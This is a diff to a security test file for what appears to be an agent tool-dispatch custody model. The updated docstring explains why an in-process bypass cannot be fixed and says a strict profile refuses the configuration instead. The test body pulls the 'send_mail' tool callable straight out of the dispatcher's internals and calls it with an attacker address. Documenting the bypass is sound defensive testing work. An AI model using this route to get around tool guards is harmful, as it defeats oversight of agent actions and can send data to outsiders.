@@ -119,6 +119,14 @@ def test_b3_registered_callable_can_be_extracted_in_process(
     process boundary. If this test ever starts failing, the custody model
     has genuinely changed and the conformance assessment for E must be
     rewritten rather than merely re-run.
+
+    The answer to this bypass is not a fix here, because there is none to
+    make in a single interpreter. It is that the configuration in which it
+    matters is refused: under a strict runtime profile the authority domain
+    cannot register a tool callable at all
+    (``test_custody_guard.py::test_k7_authority_cannot_register_tool_callables``).
+    This test runs under the research profile, where that weaker
+    configuration is supported and honestly labelled.
     """
     smuggled = dispatcher._tools["send_mail"]
     smuggled({"to": "attacker@example.com"})
